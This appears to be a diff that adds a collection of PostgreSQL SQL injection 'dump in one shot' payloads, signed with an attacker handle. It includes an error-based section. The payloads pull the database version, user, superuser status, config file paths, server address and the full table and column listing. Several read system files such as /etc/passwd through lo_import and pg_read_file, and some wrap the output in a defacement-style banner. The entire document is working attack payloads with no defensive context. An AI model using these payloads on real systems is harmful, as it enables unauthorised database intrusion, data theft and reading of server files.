@@ -1,0 +1,28 @@
+$$Alb3a_Tross ::: $$||version()||$$<br>$$||(SELECT ARRAY_TO_STRING(array(SELECT($$===>$$||table_name||$$ :: $$||column_name)::TEXT FROM information_schema.columns WHERE table_schema=$$public$$),$$<br>$$))
+
+
+
+'<center>' || '<img src="https://c.top4top.io/p_2033hvvtu0.jpg" height="175" width="200">' || '<br>' || '<br>' || '{ Inject By Alb3a_Tross }' || '<br>' || '<br>' ||  'VERSION : ' || version() || '<br>' || 'USER : ' || current_user || '<br>' || 'DATABASE : ' || current_database() || '<br>' || '<br>' || (SELECT+ARRAY_TO_STRING(ARRAY_AGG(concat($$[%E2%80%A2]$$,table_name,' :: ',column_name)::TEXT),'<br>')FROM+information_schema.columns+WHERE+table_schema+NOT+in($$informatio%E2%80%8Bn_schema$$,$$pg_catalog$$))
+
+
+
+(SELECT array_to_string(array(SELECT ('===>'||table_name||' :: '||column_name)::text FROM information_schema.columns where table_schema='public'),chr(10)))
+
+
+
+concat('<font color=black><div>'||'<img src="https://c.top4top.io/p_2033hvvtu0.jpg" height="250" width="250">'||'<br> Alb3a_Tross  <br><br> || PRINT SYSTEM || '||'<li>'||'VERSION >>> '||version()||'<li>'||'DATABASE >>> '||current_database()||'<li>'||'DB FILES >>> '||'<br>'||' - HBA >>> '||current_setting('hba_file')||'<br>'||' - DIRECTORY >>> '||current_setting('data_directory')||'<li>'||'HOSTNAME AND IP ADDRESS >>> '||'<br>'||' - PORT >>> '||inet_server_port()||'<br>'||' - ADDR >>> '||inet_server_addr()||'<li>'||'USER >>> '||user||'<li>'||'SUPERUSER >>> SHOW >>> '||current_setting('is_superuser')||'<li> POSTGRESQL READ FILE >>> <br> - Pg_Version >>> '||pg_read_file('PG_VERSION', 0, 200)||'<br> - lo_import >>> '||lo_import('/etc/hosts')||'<br><br> || DUMP DB || <li>'||(SELECT+ARRAY_TO_STRING(ARRAY_AGG(concat(table_name,' >>> ',column_name) :: TEXT),'<li>')FROM+information_schema.columns+WHERE+table_schema+NOT+in('information_schema','pg_catalog')))
+
+
+
+
+Error Based Dios:
+
+and 1=cast($$<font color=red><div>$$||$$ imns $$||$$<li> VERSION >>> $$||version()||$$<li> DATABASE >>> $$||current_database()||$$<li> USER >>> $$||user||$$<br><br><li>$$||(SELECT ARRAY_TO_STRING(ARRAY_AGG(concat(table_name,$$ >>> $$,column_name) :: TEXT),$$<li>$$)FROM information_schema.columns WHERE table_schema NOT in($$information_schema$$,$$pg_catalog$$)) as integer) and 1=1and 1=cast($$<font color=red><div>$$||$$ imns $$||$$<li> VERSION >>> $$||version()||$$<li> DATABASE >>> $$||current_database()||$$<li> USER >>> $$||user||$$<br><br><li>$$||(SELECT ARRAY_TO_STRING(ARRAY_AGG(concat(table_name,$$ >>> $$,column_name) :: TEXT),$$<li>$$)FROM information_schema.columns WHERE table_schema NOT in($$information_schema$$,$$pg_catalog$$)) as integer) and 1=1
+
+
+and 1=cast('<font color=white><div>'||' Alb3a_Tross '||'<li>'||'VERSION >>> '||version()||'<li>'||'DATABASE >>> '||current_database()||'<li>'||'DB FILES >>> '||'<br>'||' - HBA >>> '||current_setting('hba_file')||'<br>'||' - DIRECTORY >>> '||current_setting('data_directory')||'<li>'||'HOSTNAME AND IP ADDRESS >>> '||'<br>'||' - PORT >>> '||inet_server_port()||'<br>'||' - ADDR >>> '||inet_server_addr()||'<li>'||'USER >>> '||user||'<li>'||'SUPERUSER >>> SHOW >>> '||current_setting('is_superuser')||'<li> POSTGRESQL READ FILE >>> <br> - Pg_Version >>> '||pg_read_file('PG_VERSION', 0, 200)||'<br> - lo_import >>> '||lo_import('/etc/passwd')||'<br><br><li>'||(SELECT+ARRAY_TO_STRING(ARRAY_AGG(concat(table_name,' >>> ',column_name) :: TEXT),'<li>')FROM+information_schema.columns+WHERE+table_schema+NOT+in('information_schema','pg_catalog')) as integer) and 1=1
+
+
+
+
+and 1=cast($$ Alb3a_Tross $$||$$ || VERSION >>> $$||version()||$$ || DATABASE >>> $$||current_database()||$$ || USER >>> $$||user||$$ || DUMP DB || $$ ||(SELECT ARRAY_TO_STRING(ARRAY_AGG(concat(table_name,$$ :: $$,column_name) :: TEXT),$$ || $$)FROM information_schema.columns WHERE table_schema NOT in($$information_schema$$,$$pg_catalog$$)) as integer) and 1=1
